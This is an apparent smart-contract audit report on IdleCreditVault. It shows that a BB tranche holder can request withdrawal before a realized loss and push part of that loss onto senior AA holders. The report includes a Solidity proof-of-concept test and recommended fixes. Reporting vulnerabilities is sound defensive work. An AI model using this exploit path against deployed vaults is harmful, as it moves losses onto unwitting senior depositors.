### Title
BB withdrawal requests can shift realized losses onto AA holders - ([File: contracts/strategies/idle/IdleCreditVault.sol])

### Summary
`requestWithdraw` removes a BB holder’s principal from active tranche NAV and records it as an unclassified pending withdrawal. During `stopEpochWithDuration`, losses are split pro rata between all pending receipts and all active positions, while only the remaining active loss follows the BB-first waterfall. A BB holder can therefore convert junior exposure into a generic pending receipt before a realized loss and make AA absorb part of that loss.

### Finding Description
A withdrawal request burns the CDO’s strategy-token principal and creates a pending receipt, reducing the requesting tranche’s active NAV without retaining whether the receipt originated from AA or BB. [1](#0-0) [2](#0-1) 

When a loss is processed, `previewLossAdjustedWithdrawFunds` calculates `pendingLoss = loss * pendingBasis / totalBasis` and returns only the remainder as the active loss. [3](#0-2)  `IdleCDOEpochVariant` funds the haircut pending amount and then burns the active-loss remainder, which is passed through the ordinary waterfall. [4](#0-3) [5](#0-4) 

This violates the stated invariant that ordinary losses exhaust BB NAV before reducing AA NAV. [6](#0-5) [7](#0-6)  The loss-adjusted receipt is then paid using the pro-rata recovery price rather than the origin tranche’s waterfall position. [8](#0-7) 

### Impact Explanation
With 100 AA and 100 BB, if the sole BB holder requests withdrawal and a 50-underlying loss is subsequently recorded, the pending and active bases are each 100. The code assigns 25 to the pending BB receipt and 25 to active AA. AA NAV falls to 75 and the pending BB receipt receives 75, even though correct seniority would leave AA at 100 and BB at 50.

The attacker’s loss is reduced by 25 and the same amount is imposed on AA. The required loss is reported through the honest manager’s normal `stopEpochWithDuration` call; the attacker only performs an unprivileged withdrawal request during the buffer.

### Likelihood Explanation
The path only requires a BB holder to submit a normal withdrawal request before a loss is finalized. Epochs explicitly support pending withdrawal receipts, and realized losses are an existing operating mode. The issue is deterministic whenever junior-originated pending receipts coexist with active senior NAV.

### Recommendation
Retain tranche identity for each pending withdrawal request and apply losses to pending receipts according to the same BB-first waterfall as active NAV. At minimum, track separate AA and BB pending bases and consume the pending BB basis before assigning any residual loss to AA. Alternatively, keep withdrawn tranche NAV classified as junior until its receipt is fully settled.

### Proof of Concept
```solidity
function testPendingBBWithdrawShiftsLossToAA() external {
    uint256 amount = 100 * ONE_SCALE;
    uint256 loss = 50 * ONE_SCALE;
    address bbUser = makeAddr("bb-user");

    idleCDO.depositAA(amount);
    _depositWithUser(bbUser, amount, false); // BB deposit

    // Isolate principal-loss behavior.
    vm.prank(manager);
    IdleCreditVault(address(strategy)).setAprs(0, 0);
    _startEpochAndCheckPrices(0);

    uint256 duration = cdoEpoch.epochDuration();
    vm.warp(cdoEpoch.epochEndDate() + 1);

    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);

    // The BB holder converts junior NAV into an unclassified pending receipt.
    vm.prank(bbUser);
    uint256 pendingBB = cdoEpoch.requestWithdraw(
        IERC20(BBtranche).balanceOf(bbUser),
        address(BBtranche)
    );
    assertEq(pendingBB, amount);
    assertEq(cdoEpoch.lastNAVBB(), 0);

    _startEpochAndCheckPrices(1);
    vm.warp(cdoEpoch.epochEndDate() + 1);

    (uint256 pendingToFund,) =
        IdleCreditVault(address(strategy))
            .previewLossAdjustedWithdrawFunds(loss);

    // pendingToFund == 75: 25 of the 50 loss is charged to the BB receipt.
    assertEq(pendingToFund, 75 * ONE_SCALE);

    deal(defaultUnderlying, borrower, pendingToFund);
    vm.prank(borrower);
    IERC20Detailed(defaultUnderlying).approve(
        address(cdoEpoch),
        pendingToFund
    );

    vm.prank(manager);
    cdoEpoch.stopEpochWithDuration(0, 0, duration, loss);

    // The remaining 25 active loss is borne entirely by AA.
    assertEq(cdoEpoch.lastNAVAA(), 75 * ONE_SCALE);
    assertEq(cdoEpoch.virtualPrice(address(AAtranche)), 75 * ONE_SCALE / 100);

    uint256 bbBalanceBefore =
        IERC20Detailed(defaultUnderlying).balanceOf(bbUser);
    vm.prank(bbUser);
    cdoEpoch.claimWithdrawRequest();

    // BB loses only 25 instead of absorbing the entire 50 loss.
    assertEq(
        IERC20Detailed(defaultUnderlying).balanceOf(bbUser)
            - bbBalanceBefore,
        75 * ONE_SCALE
    );
}
```

```text
  function previewLossAdjustedWithdrawFunds(uint256 _lossAmount) external view returns (uint256 pendingToFund, uint256 activeLoss) {
    uint256 pendingBasis = pendingWithdraws;
    // Full zero-loss funding is safe for legacy aggregate receipts and needs no migration call.
    if (_lossAmount == 0) return (pendingBasis, _lossAmount);

    IIdleCDOEpochVariant cdo = IIdleCDOEpochVariant(idleCDO);
    uint256 activeBasis = _lossActiveBasis(cdo);
    if (pendingBasis == 0) {
      if (_lossAmount > activeBasis) revert NotAllowed();
      return (0, _lossAmount);
    }

    // Legacy pending receipts do not have the per-epoch ownership data needed to store a haircut.
    if (!defaultRecoveryInitialized) revert NotAllowed();
    uint256 totalBasis = activeBasis + pendingBasis;
    if (_lossAmount >= totalBasis) revert NotAllowed();

    uint256 pendingLoss = _lossAmount * pendingBasis / totalBasis;
    pendingToFund = pendingBasis - pendingLoss;
    activeLoss = _lossAmount - pendingLoss;
```
